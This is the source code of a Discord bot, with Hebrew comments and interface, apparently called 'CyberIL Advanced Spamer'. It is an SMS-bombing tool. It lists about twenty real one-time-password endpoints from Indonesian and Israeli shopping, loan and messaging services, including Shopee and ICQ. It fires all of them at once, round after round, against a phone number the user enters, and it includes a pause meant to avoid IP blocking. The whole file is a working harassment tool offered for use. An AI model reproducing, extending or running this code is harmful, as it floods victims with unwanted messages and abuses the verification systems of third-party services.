import discord
from discord.ext import commands
import aiohttp
import asyncio
import os
import random

# ==================== CONFIG ====================
TOKEN = os.getenv("BOT_TOKEN")
intents = discord.Intents.default()
intents.message_content = True 

# ==================== THE COMPLETE API LIST FROM FILE ====================
ALL_APIs = [
    # --- שירותי צרכנות וקניות ---
    {"name": "Matahari", "url": "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", "method": "POST", "json": {"otp_request": {"mobile_number": "{{phone}}", "mobile_country_code": "+62"}}},
    {"name": "KlikIndomaret", "url": "https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={{phone}}", "method": "GET"},
    {"name": "Shopee", "url": "https://shopee.co.id/api/v4/otp/send_vcode", "method": "POST", "json": {"phone": "{{phone}}", "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1,2,3]}},
    {"name": "Ruparupa", "url": "https://wapi.ruparupa.com/auth/generate-otp", "method": "POST", "json": {"phone": "0{{phone_no_zero}}", "action": "register", "channel": "message"}},
    {"name": "Sociolla", "url": "https://soco-api.sociolla.com/auth/otp/code", "method": "POST", "json": {"mode": "sms", "entity": "phone_no"}},
    {"name": "Redbus", "url": "https://m.redbus.id/api/getOtp?number={{phone}}", "method": "GET"},
    {"name": "Depop", "url": "https://webapi.depop.com/api/auth/v1/verify/phone", "method": "PUT", "json": {"phone_number": "{{phone}}", "country_code": "ID"}},

    # --- שירותים פיננסיים והלוואות ---
    {"name": "Payfazz", "url": "https://api.payfazz.com/v2/phoneVerifications", "method": "POST", "json": {"phone": "0{{phone_no_zero}}"}},
    {"name": "RupiahCepat", "url": "https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code", "method": "POST", "data": {"data": '{"mobile_no": "{{phone}}"}'}},
    {"name": "Battlefront_Danacepat", "url": "https://battlefront.danacepat.com/v1/auth/common/phone/send-code", "method": "POST", "json": {"mobile_no": "{{phone}}"}},
    {"name": "Pinjamindo", "url": "https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62{{phone_no_zero}}", "method": "GET"},
    {"name": "Adakami", "url": "https://api.adakami.id/adaKredit/pesan/kodeVerifikasi", "method": "POST", "json": {"ketik": 0, "nomor": "0{{phone_no_zero}}"}},

    # --- טכנולוגיה, תקשורת ואימותים ---
    {"name": "Klikwa", "url": "https://api.klikwa.net/v1/number/sendotp", "method": "POST", "headers": {"Authorization": "Basic QjMzOkZSMzM="}, "json": {"phone": "{{phone}}"}},
    {"name": "Ktbs", "url": "https://core.ktbs.io/v2/user/registration/otp/{{phone}}", "method": "GET"},
    {"name": "Asani", "url": "https://api.asani.co.id/api/v1/send-otp", "method": "POST", "json": {"phone": "62{{phone_no_zero}}", "email": f"user{random.randint(1,999)}@gmail.com"}},
    {"name": "Jumpstart", "url": "https://api.jumpstart.id/graphql", "method": "POST", "json": {"operationName": "CheckPhoneNoAndGenerateOtpIfNotExist", "variables": {"phoneNo": "{{phone}}"}, "query": "mutation CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) { checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo) }"}},
    {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={{phone}}", "method": "POST"},
    {"name": "ICQ", "url": "https://u.icq.net/api/v14/rapi/auth/sendCode", "method": "POST", "json": {"params": {"phone": "62{{phone_no_zero}}", "language": "en-US", "route": "sms", "application": "icq"}}},
    {"name": "Coowry", "url": "https://www.coowry.com/api/tokens", "method": "POST", "json": {"msisdn": "+62{{phone_no_zero}}"}},

    # --- שירותים מקומיים נוספים (בונוס מהקוד המקורי) ---
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
    {"name": "Mishloha", "url": "https://www.mishloha.co.il/api/v1/auth/otp", "method": "POST", "json": {"phone": "{{phone}}"}}
]

active_bombs = {}

# ==================== ENGINE ====================
async def run_attack(session, api, phone, user_id):
    if active_bombs.get(user_id) is False: return
    
    no_zero = phone[1:] if phone.startswith('0') else phone
    
    # החלפת תבניות ב-URL ובגוף הבקשה
    url = api["url"].replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
    
    def fix_val(obj):
        if isinstance(obj, dict): return {k: fix_val(v) for k, v in obj.items()}
        if isinstance(obj, str): return obj.replace("{{phone}}", phone).replace("{{phone_no_zero}}", no_zero)
        return obj

    payload = fix_val(api.get("json"))
    form_data = fix_val(api.get("data"))
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json"
    }
    if api.get("headers"): headers.update(api["headers"])

    try:
        async with session.request(api["method"], url, json=payload, data=form_data, headers=headers, timeout=10) as r:
            # הדפסת לוג לטרמינל כדי לראות מה עובד
            print(f"[{api['name']}] Status: {r.status}")
    except:
        pass

# ==================== DISCORD BOT UI ====================
class BomberModal(discord.ui.Modal, title='🔥 SMS SPAMER v5 - FULL LIST'):
    phone = discord.ui.TextInput(label='מספר יעד', placeholder='05XXXXXXXX', min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label='כמות סבבים', default='1')

    async def on_submit(self, interaction: discord.Interaction):
        target = self.phone.value
        user_id = interaction.user.id
        active_bombs[user_id] = True
        
        await interaction.response.send_message(f"🚀 ההפצצה החלה על {target}! משתמש ב-{len(ALL_APIs)} מקורות מהקובץ.", ephemeral=True)
        
        async with aiohttp.ClientSession() as session:
            for _ in range(int(self.rounds.value)):
                if active_bombs.get(user_id) is False: break
                tasks = [run_attack(session, api, target, user_id) for api in ALL_APIs]
                await asyncio.gather(*tasks)
                await asyncio.sleep(2) # הפוגה קלה למניעת חסימת IP מהירה מדי
        
        active_bombs.pop(user_id, None)

class ControlView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="🚀 התחל", style=discord.ButtonStyle.danger)
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BomberModal())
    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_bombs[interaction.user.id] = False
        await interaction.response.send_message("ההפצצה הופסקה על ידי המשתמש.", ephemeral=True)

class MyBot(commands.Bot):
    def __init__(self): super().__init__(command_prefix='!', intents=intents)
    async def setup_hook(self): await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup", description="הפעלת לוח הבקרה של הספאמר")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="🚀 CyberIL Advanced Spamer", description=f"המערכת טעונה ב-{len(ALL_APIs)} APIs מהקובץ המעודכן.", color=0xff0000)
    await interaction.response.send_message(embed=embed, view=ControlView())

bot.run(TOKEN)
